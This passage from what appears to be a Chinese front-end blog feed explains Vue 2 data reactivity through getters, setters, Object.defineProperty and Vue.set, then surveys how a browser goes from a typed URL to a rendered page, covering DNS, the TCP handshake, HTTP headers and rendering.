(&#123;</span><br><span class="line">    data: myData,</span><br><span class="line">    template: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; n &#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;button @click="add"&gt; +10 &lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        add() &#123;</span><br><span class="line">            <span class="keyword">this</span>.n += <span class="number">10</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).$mount(<span class="string">"#app"</span>)</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    myData.n += <span class="number">10</span></span><br><span class="line">    <span class="built_in">console</span>.log(myData)  <span class="comment">// 第二次log出的结果为 &#123; n:(...) &#125;</span></span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br></pre></td></tr></table></figure>
<h4 id="为什么两次log出的myData会不一致？需要先了解一下ES6中的getter和setter"><a href="#为什么两次log出的myData会不一致？需要先了解一下ES6中的getter和setter" class="headerlink" title="为什么两次log出的myData会不一致？需要先了解一下ES6中的getter和setter"></a>为什么两次log出的myData会不一致？需要先了解一下ES6中的getter和setter</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj0 = &#123;</span><br><span class="line">    姓: <span class="string">"高"</span>,</span><br><span class="line">    名: <span class="string">"圆圆"</span>,</span><br><span class="line">    age: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需求一：拿到姓名</span></span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;</span><br><span class="line">    姓: <span class="string">"高"</span>,</span><br><span class="line">    名: <span class="string">"圆圆"</span>,</span><br><span class="line">    姓名() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.姓 + <span class="keyword">this</span>.名;</span><br><span class="line">    &#125;,</span><br><span class="line">    age: <span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj1.姓名());  <span class="comment">// 姓名() 是一个函数，后面的括号不能省略</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需求二：函数后面的括号如何去掉</span></span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;</span><br><span class="line">    姓: <span class="string">"高"</span>,</span><br><span class="line">    名: <span class="string">"圆圆"</span>,</span><br><span class="line">    <span class="keyword">get</span> 姓名() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.姓 + <span class="keyword">this</span>.名</span><br><span class="line">    &#125;,</span><br><span class="line">    age: <span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj2.姓名);  <span class="comment">// 在函数名前加上get，在调用时函数可以不加括号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需求三：函数可以被“写”</span></span><br><span class="line"><span class="keyword">let</span> obj3 = &#123;</span><br><span class="line">    姓: <span class="string">"高"</span>,</span><br><span class="line">    名: <span class="string">"圆圆"</span>,</span><br><span class="line">    <span class="keyword">get</span> 姓名() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.姓 + <span class="keyword">this</span>.名;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span> 姓名(xxx) &#123;</span><br><span class="line">        <span class="keyword">this</span>.姓 = xxx[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">this</span>.名 = xxx.slice(<span class="number">1</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    age: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line">obj3.姓名 = <span class="string">"高媛媛"</span>  <span class="comment">// set的用法</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`姓 <span class="subst">$&#123;obj3.姓&#125;</span>，名 <span class="subst">$&#123;obj3.名&#125;</span>`</span>)</span><br><span class="line"><span class="built_in">console</span>.log(obj3)</span><br></pre></td></tr></table></figure>
<p><img src="https://s3.bmp.ovh/imgs/2022/04/29/1f06e0e511399430.png" alt></p>
<ul>
<li>虽然在声明obj3时并未声明 姓名 这样的属性，但你确实可以对它进行读、写的操作，打印出的结果为 <strong><em>姓名: (…)</em></strong></li>
<li>n: (…) 的意思就是并不存在n这样的属性，但是它身上有一个 get n 和 set n 来模拟对n的读写操作</li>
</ul>
<h2 id="Object-defineProperty"><a href="#Object-defineProperty" class="headerlink" title="Object.defineProperty()"></a>Object.defineProperty()</h2><ul>
<li>定义完一个对象后，想要在它身上再添加额外的getter和setter时使用Object.defineProperty()</li>
<li>可以给对象添加属性value，也可以添加getter、setter</li>
<li>getter、setter用于对属性的读写进行监控<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> _xxx = <span class="number">0</span>  <span class="comment">// 声明一个容器，用来存放 xxx 的值</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj1, <span class="string">'xxx'</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> _xxx</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span>(value) &#123;</span><br><span class="line">        _xxx = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)  <span class="comment">// 给obj1增加了一个名为 xxx 的属性，值为0</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="使用Object-defineProperty-完成几个需求"><a href="#使用Object-defineProperty-完成几个需求" class="headerlink" title="使用Object.defineProperty()完成几个需求"></a>使用Object.defineProperty()完成几个需求</h3><h4 id="需求一：用Object-defineProperty-定义n的值"><a href="#需求一：用Object-defineProperty-定义n的值" class="headerlink" title="需求一：用Object.defineProperty()定义n的值"></a>需求一：用Object.defineProperty()定义n的值</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> data0 = &#123;</span><br><span class="line">    n: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> data1 = &#123;&#125;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(data1, <span class="string">'n'</span>, &#123;</span><br><span class="line">    value: <span class="number">0</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`需求1：<span class="subst">$&#123;data1.n&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>
<h4 id="需求二：n不能小于0，即data2-n-1-无效，data2-n-1有效"><a href="#需求二：n不能小于0，即data2-n-1-无效，data2-n-1有效" class="headerlink" title="需求二：n不能小于0，即data2.n = -1 无效，data2.n = 1有效"></a>需求二：n不能小于0，即data2.n = -1 无效，data2.n = 1有效</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> data2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line">data2._n = <span class="number">0</span>  <span class="comment">// 用来存储 n 的值</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(data2, <span class="string">'n'</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>._n</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span>(value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(value &lt; <span class="number">0</span>) <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">this</span>._n = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`需求2：<span class="subst">$&#123;data2.n&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">data2.n = <span class="number">-1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`需求2：<span class="subst">$&#123;data2.n&#125;</span> 设置为-1 失败`</span>)</span><br><span class="line"></span><br><span class="line">data2.n = <span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`需求2：<span class="subst">$&#123;data2.n&#125;</span> 设置为 1 成功`</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 问题：虽然这样可以满足需求，但如果有人直接修改data2._n的值怎么办？</span></span><br></pre></td></tr></table></figure>
<h4 id="使用代理，解决上述问题"><a href="#使用代理，解决上述问题" class="headerlink" title="使用代理，解决上述问题"></a>使用代理，解决上述问题</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> data3 = proxy(&#123;  <span class="comment">// 括号里是匿名对象，无法访问</span></span><br><span class="line">    data: &#123;<span class="attr">n</span>:<span class="number">0</span>&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span>(<span class="params">&#123;data&#125;</span>)</span>&#123;  <span class="comment">/* 解构赋值 */</span></span><br><span class="line">    <span class="keyword">const</span> obj = &#123;&#125;</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(obj,<span class="string">'n'</span>, &#123;</span><br><span class="line">        <span class="keyword">get</span>()&#123;</span><br><span class="line">            <span class="keyword">return</span> data.n</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">set</span>(value) &#123;</span><br><span class="line">            <span class="keyword">if</span>(value &lt; <span class="number">0</span>) <span class="keyword">return</span></span><br><span class="line">            data.n = value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> obj  <span class="comment">// obj就是代理：对obj做什么，就会同样作用在 data3 身上</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// data3 就是 obj</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`需求3： <span class="subst">$&#123;data3.n&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">data3.n = <span class="number">-1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`需求3 ： <span class="subst">$&#123;data3.n&#125;</span> 设置为-1 失败`</span>);</span><br><span class="line"></span><br><span class="line">data3.n = <span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`需求3 ： <span class="subst">$&#123;data3.n&#125;</span> 设置为1 成功`</span>);</span><br></pre></td></tr></table></figure>
<h4 id="需求四：解决绕过代理的问题，就算有人修改myData，也要拦截他"><a href="#需求四：解决绕过代理的问题，就算有人修改myData，也要拦截他" class="headerlink" title="需求四：解决绕过代理的问题，就算有人修改myData，也要拦截他"></a>需求四：解决绕过代理的问题，就算有人修改myData，也要拦截他</h4><p>下面是可以被用户修改的myData<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myData = &#123; <span class="attr">n</span>:<span class="number">0</span> &#125;  <span class="comment">// 声明一个引用，这样就可以绕过代理，直接修改myData</span></span><br><span class="line"><span class="keyword">let</span> data4 = proxy(&#123; <span class="attr">data</span>: myData &#125;)  <span class="comment">// 括号里是匿名对象，无法访问</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`杠精：<span class="subst">$&#123;data4.n&#125;</span>`</span>)</span><br><span class="line">myData.n = <span class="number">-1</span>  <span class="comment">// 绕过代理，成功修改了myData</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`杠精：<span class="subst">$&#123;data4.n&#125;</span>, 设置为-1成功了`</span>)</span><br></pre></td></tr></table></figure></p>
<p>解决绕过代理的问题，不要让用户擅自修改myData<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myData5 = &#123;<span class="attr">n</span>:<span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">let</span> data5 = proxy2(&#123; <span class="attr">data</span>:myData5 &#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy2</span>(<span class="params">&#123;data&#125;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> value = data.n</span><br><span class="line">    <span class="comment">// 省略了delete.data.n，使用Object.defineProperty时会覆盖掉</span></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(data, <span class="string">'n'</span>, &#123;</span><br><span class="line">        <span class="keyword">get</span>() &#123;</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">set</span>(newValue)&#123;</span><br><span class="line">            <span class="keyword">if</span>(newValue &lt; <span class="number">0</span>) <span class="keyword">return</span></span><br><span class="line">            value = newValue</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;  <span class="comment">// 上面几句，可以监听 data</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">'n'</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> data.n</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span>(value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(value&lt;<span class="number">0</span>)<span class="keyword">return</span></span><br><span class="line">        data.n = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> obj  <span class="comment">// 用 obj 对 data 进行代理</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`需求4：<span class="subst">$&#123;data4.n&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">myData5.n = <span class="number">-1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`需求4：<span class="subst">$&#123;data4.n&#125;</span> 设置为 -1 失败`</span>)</span><br><span class="line"></span><br><span class="line">myData5.n = <span class="number">2</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`需求4：<span class="subst">$&#123;data4.n&#125;</span> 设置为 1 成功`</span>)</span><br></pre></td></tr></table></figure></p>
<h4 id="什么是代理"><a href="#什么是代理" class="headerlink" title="什么是代理"></a>什么是代理</h4><ul>
<li>对 myData 对象的属性进行读写，全权由另一个对象vm来负责</li>
<li>那么，vm 就是 myData 的代理</li>
<li><p>不用 myData.n 偏偏用 this.n 或 vm.n</p>
<h3 id="new-Vue做了什么"><a href="#new-Vue做了什么" class="headerlink" title="new Vue做了什么"></a>new Vue做了什么</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 看着很相似的两行代码</span></span><br><span class="line"><span class="keyword">let</span> data4 = proxy(&#123;<span class="attr">data</span>: myData4&#125;)</span><br><span class="line"><span class="keyword">let</span> vm = <span class="keyword">new</span> Vue(&#123;<span class="attr">data</span>: myData&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>会让vm成为myData的代理，可以通过 this.myData 访问到 myData</p>
</li>
<li>会监听 myData 的所有属性（赋值给value，再通过getter、setter添加虚拟属性）</li>
<li>监听的目的是防止 myData 属性改变，vm不知道</li>
<li>当vm监测到myData发生改变，就调用render(data)，刷新视图<br><img src="https://s3.bmp.ovh/imgs/2022/04/29/fb62a7959d5ff0ff.png" alt></li>
</ul>
<h2 id="Vue的数据响应式"><a href="#Vue的数据响应式" class="headerlink" title="Vue的数据响应式"></a>Vue的数据响应式</h2><h3 id="Vue-的-data-是响应式的"><a href="#Vue-的-data-是响应式的" class="headerlink" title="Vue 的 data 是响应式的"></a>Vue 的 data 是响应式的</h3><ul>
<li>const vm = new Vue({data: {n:0}})</li>
<li>如果修改 vm.n ，那么UI中的n就会进行响应</li>
<li>Vue是通过 Object.defineProperty 来实现数据响应式的<h3 id="Vue-的-data-的bug"><a href="#Vue-的-data-的bug" class="headerlink" title="Vue 的 data 的bug"></a>Vue 的 data 的bug</h3>问题：如果一开始在data中并未对 b 进行赋值，Vue就不能对它进行代理或监听<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">        obj: &#123;</span><br><span class="line">            a: <span class="number">0</span>  <span class="comment">// obj.a 会被Vue监听和代理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    template: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; obj.b &#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;button @click="setB"&gt;set b&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;button @click="addB"&gt;b+1&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        setB()&#123;</span><br><span class="line">            <span class="keyword">this</span>.obj.b = <span class="number">1</span>  <span class="comment">// 这种写法页面中不会显示b的值，因为Vue没办法监听一开始就未设置在data中的obj.b</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解决方法，使用Vue.set 或 this.$set</span></span><br><span class="line">            <span class="built_in">console</span>.log(Vue.set === <span class="keyword">this</span>.$<span class="keyword">set</span>)  // 下面两种写法等价</span><br><span class="line">            Vue.<span class="keyword">set</span>(this.obj, 'b', 1)  </span><br><span class="line">            this.$<span class="keyword">set</span>(this.obj, 'b', 1)</span><br><span class="line">        &#125;,</span><br><span class="line">        addB() &#123;</span><br><span class="line">            <span class="keyword">this</span>.obj.b += <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).$mount(<span class="string">"#app"</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>解决方法：使用 Vue.set 或 this.$set，作用是：</p>
<ul>
<li>新增key</li>
<li>自动创建监听和代理</li>
<li>触发ui进行更新(但并不是立即更新)</li>
</ul>
<p>eg：this.$set(this.object, ‘m’, 10)</p>
<h3 id="如果data是一个数组呢？"><a href="#如果data是一个数组呢？" class="headerlink" title="如果data是一个数组呢？"></a>如果data是一个数组呢？</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">        array: [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>]  <span class="comment">// array: &#123;0:'a', 1:'b', 2:'c'&#125;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    template: <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123;array&#125;&#125;</span></span><br><span class="line"><span class="string">            &lt;button @click="setD"&gt;setD&lt;/button&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        setD() &#123;  <span class="comment">// 3种 setD 的方法</span></span><br><span class="line">            <span class="keyword">this</span>.array[<span class="number">3</span>] = <span class="string">'d'</span>  <span class="comment">// 页面中不会出现'd' Vue不能监测到新增的d</span></span><br><span class="line">            <span class="keyword">this</span>.$<span class="keyword">set</span>(this.array, 3, 'd')  // 可以用$<span class="keyword">set</span>的方法，但每次都用<span class="keyword">set</span>会不会很麻烦</span><br><span class="line">            this.array.push('d')  // 这个push方法被尤雨溪篡改了，有两个作用：一是调用以前的push方法，二是增加代理和监听</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>当你将一个数组传给Vue的data，Vue会对这个数组进行篡改，它会在原来数组对象中间增加一层原型，这个原型上有7个方法</p>
<p>来看看push是如何被篡改的？<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VueArray</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">    push(...args) &#123;</span><br><span class="line">        <span class="keyword">const</span> oldLength = <span class="keyword">this</span>.length  <span class="comment">// this就是当前数组</span></span><br><span class="line">        <span class="keyword">super</span>.push(...args)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'你 push 了'</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = oldLength; i&lt;<span class="keyword">this</span>.length; i++)&#123;  <span class="comment">// i为所有push的元素的下标，遍历旧数组到新数组的下标</span></span><br><span class="line">            Vue.set(<span class="keyword">this</span>, i, <span class="keyword">this</span>[i])  <span class="comment">// 在当前数组this上，添加i项，每项i的值为this[i]，并将每个新增的key通过Vue.set告知给Vue</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="对象中新增的key"><a href="#对象中新增的key" class="headerlink" title="对象中新增的key"></a>对象中新增的key</h3><ul>
<li>Vue没办法事先监听和代理</li>
<li>要使用 Vue.set / this.$set 来新增key，创建监听和代理、更新ui</li>
<li>最好的方式是将属性都写出来，不要新增key。但数组没办法做到不新增key<h3 id="数组中新增的key"><a href="#数组中新增的key" class="headerlink" title="数组中新增的key"></a>数组中新增的key</h3></li>
<li>可以用 Vue.set / this.$set 来新增key，创建监听和代理、更新ui</li>
<li>但尤玉溪篡改了数组的7个API方便对数组进行增删</li>
<li>这7个API会自动处理监听和代理、更新ui</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>从输入url到页面加载完成</title>
    <url>/2018/08/02/%E4%BB%8E%E8%BE%93%E5%85%A5url%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%88%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>网上那么多总结，你理清楚了嘛<br><a id="more"></a></p>
<h2 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h2><ul>
<li>用户输入url地址，浏览器解析url解析出主机名</li>
<li>DNS查询（从主机名到一个服务器IP地址的转换）</li>
<li>建立一条与目标web服务器的TCP连接（客户端和服务端都需要到各自可收发，因此需要三次握手）</li>
<li>发送HTTP请求（请求四部分）</li>
<li>后台处理请求（监听80端口、路由、渲染HTML模版、生成响应）</li>
<li>发送HTTP响应</li>
<li>关闭TCP连接（四次挥手）</li>
<li>浏览器解析并渲染页面</li>
</ul>
<h3 id="DNS查询（从主机名到一个服务器IP地址的转换）"><a href="#DNS查询（从主机名到一个服务器IP地址的转换）" class="headerlink" title="DNS查询（从主机名到一个服务器IP地址的转换）"></a>DNS查询（从主机名到一个服务器IP地址的转换）</h3><ul>
<li>网址：URL（统一资源定位符）用于定位互联网上的资源，格式一般为：协议类型://&lt;主机名&gt;:&lt;端口&gt;/&lt;路径&gt;/文件名</li>
<li>IP地址：例如代表本机的IP就是127.0.0.1，每个网站都是靠IP来定位的。比方说知乎的网址是 <a href="https://www.zhihu.com/" target="_blank" rel="noopener">https://www.zhihu.com/</a> 但浏览器并不知道它是什么，而是需要通过查找该网址所在服务器的IP地址获得目标，这个过程就是域名解析</li>
<li>DNS查询获得IP地址</li>
</ul>
<p>a. 查找浏览器缓存看是否有该域名对应的解析过的IP地址；<br>b. 查找操作系统缓存，浏览器会从hosts文件查找是否储存有DNS信息，是否有目标域名及对应的IP地址；<br>c. 查找路由器缓存；<br>d. 查找ISP(Internet Service Provider) DNS 缓存服务器；<br>e. 迭代查询，从顶级域名服务器的根域名服务器开始递归查询<br><img src="https://i.loli.net/2018/07/03/5b3b8e7bd5b93.png" alt="DNS解析.png"></p>
<h3 id="建立TCP连接"><a href="#建立TCP连接" class="headerlink" title="建立TCP连接"></a>建立TCP连接</h3><p>三次握手：由客户端执行connect来触发</p>
<p>1、client将标志位SYN设置为1，随机产生一个seq=J，并将数据包发送给server，此时client进入SYN_SEND状态，等待server确认</p>
<p>2、server收到数据由标志位SYN=1知道客户端想要请求建立连接，server将标志位SYN和ACK都设置为1，ack=J+1（序号+1），随机产生一个seq=k，并将数据包发送给client确认连接请求，此时server进入SYN_RCVD状态</p>
<p>3、client收到确认后，检查ACK是否为1，ack是否为J+1，如果正确则连接成功，此时client和server都进入ESTABLISHED状态，完成三次握手<br><img src="https://i.loli.net/2018/08/21/5b7c1e5c7927a.png" alt="三次握手"></p>
<h3 id="发送HTTP请求"><a href="#发送HTTP请求" class="headerlink" title="发送HTTP请求"></a>发送HTTP请求</h3><p>在得到IP地址后，浏览器会发送出一个HTTP请求，请求包括请求头和请求体。请求头通常有：请求方法（GET、POST、HEAD、OPTIONS, PUT, DELETE, TRACE 和 CONNECT）、目标url、遵循的协议（http、https、file等）</p>
<h3 id="后台处理请求"><a href="#后台处理请求" class="headerlink" title="后台处理请求"></a>后台处理请求</h3><p>服务器通过http报文作为信息载体将数据返回给客户端</p>
<p>常用请求头：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept: 接收类型，表示浏览器支持的MIME类型（对应服务端返回的Content-Type）</span><br><span class="line">Content-Type：客户端发送出去实体内容的类型</span><br><span class="line">Content-length：用来指明发送给接收方的消息主体的大小</span><br><span class="line">Cache-Control: 指定请求和响应遵循的缓存机制，如no-cache</span><br><span class="line">Expires：缓存控制，在这个时间内不会请求，直接使用缓存，http1.0，而且是服务端时间</span><br><span class="line">Max-age：代表资源在本地缓存多少秒，有效时间内不会请求，而是使用缓存，http1.1中</span><br><span class="line">If-None-Match：对应服务端的ETag，用来匹配文件内容是否改变（非常精确），http1.1中</span><br><span class="line">Cookie: 有cookie并且同域访问时会自动带上</span><br><span class="line">Host：请求的服务器URL</span><br><span class="line">Origin：最初的请求是从哪里发起的（只会精确到端口）,Origin比Referer更尊重隐私</span><br><span class="line">Referer：该页面的来源URL(适用于所有类型的请求，会精确到详细页面地址，csrf拦截常用到这个字段)</span><br><span class="line">User-Agent：用户客户端的一些必要信息，如UA头部等</span><br></pre></td></tr></table></figure></p>
<p>常用响应头<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Headers: 服务器端允许的请求Headers</span><br><span class="line">Access-Control-Allow-Methods: 服务器端允许的请求方法</span><br><span class="line">Access-Control-Allow-Origin: 服务器端允许的请求Origin头部（譬如为*）</span><br><span class="line">Content-Type：服务端返回的实体内容的类型</span><br><span class="line">Date：数据从服务器发送的时间</span><br><span class="line">Cache-Control：告诉浏览器或其他客户，什么环境可以安全的缓存文档</span><br><span class="line">Last-Modified：请求资源的最后修改时间</span><br><span class="line">Expires：应该在什么时候认为文档已经过期,从而不再缓存它</span><br><span class="line">Max-age：客户端的本地资源应该缓存多少秒，开启了Cache-Control后有效</span><br><span class="line">ETag：请求变量的实体标签的当前值</span><br><span class="line">Set-Cookie：设置和页面关联的cookie，服务器通过这个头部把cookie传给客户端</span><br><span class="line">Keep-Alive：如果客户端有keep-alive，服务端也会有响应（如timeout=38）</span><br><span class="line">Server：服务器的一些相关信息</span><br></pre></td></tr></table></figure></p>
<p>通常请求头和响应头是相互匹配的<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 请求头部的Accept要和响应头部的Content-Type匹配，否则会报错</span><br><span class="line">- 跨域请求时，请求头部的Origin要匹配响应头部的Access-Control-Allow-Origin，否则会报跨域错误</span><br><span class="line">- 在使用缓存时，请求头部的If-Modified-Since、If-None-Match分别和响应头部的Last-Modified、ETag对应</span><br></pre></td></tr></table></figure></p>
<h3 id="关闭TCP连接"><a href="#关闭TCP连接" class="headerlink" title="关闭TCP连接"></a>关闭TCP连接</h3><p>四次挥手<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主动方：我已经关闭了向你那边的主动通道，此时你只能被动接受</span><br><span class="line">被动方：我收到了通道关闭的消息</span><br><span class="line">被动方：好的那我告诉你，我也关闭了这边向你的主动通道</span><br><span class="line">主动方：最后收到通知，之后双方无法通信</span><br></pre></td></tr></table></figure></p>
<h3 id="浏览器解析并渲染页面"><a href="#浏览器解析并渲染页面" class="headerlink" title="浏览器解析并渲染页面"></a>浏览器解析并渲染页面</h3><p>大致流程：解析HTML，构建DOM树 -&gt; 解析CSS，生成CSS规则树 -&gt; 下载并解析JS -&gt; 下载并解析图片（异步下载，不会阻塞解析流程） -&gt; 合并DOM和CSS规则，生成render树 -&gt; 布局并渲染render树 -&gt; 执行JS文件</p>
<ul>
<li><p>浏览器接收 HTML 文件转换为 DOM 树<br>字节数据 =&gt; 字符串 =&gt; Token =&gt; Node =&gt; DOM</p>
</li>
<li><p>将 CSS 文件转换为 CSSOM 树<br>字节数据 =&gt; 字符串 =&gt; Token =&gt; Node =&gt; CSSOM</p>
</li>
<li><p>将 DOM 树和 CSSOM 树合并生成渲染树<br>这个过程不只是简单的将两者合并，渲染树只会包括需要现实的节点和这些节点的样式信息，例如 display: none; 就不会显示出来</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>vue起步</title>
    <url>/2022/04/25/vue%E8%B5%B7%E6%AD%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="vue的两个版本"><a href="#vue的两个版本" class="headerlink" title="vue的两个版本"></a>vue的两个版本</h2><ul>
<li>vue有两个版本，即完整版（vue.js）和 非完整版也叫运行时版本（vue.runtime.js）</li>
<li>运行时：用来创建Vue实例、渲染处理虚拟DOM</li>
<li>编译器：用于将模板字符串编译成JS渲染函数的代码</li>
<li>完整版：运行时 + 编译器<br><img src="https://s3.bmp.ovh/imgs/2022/04/25/53dddc657b878bbd.png" alt></li>
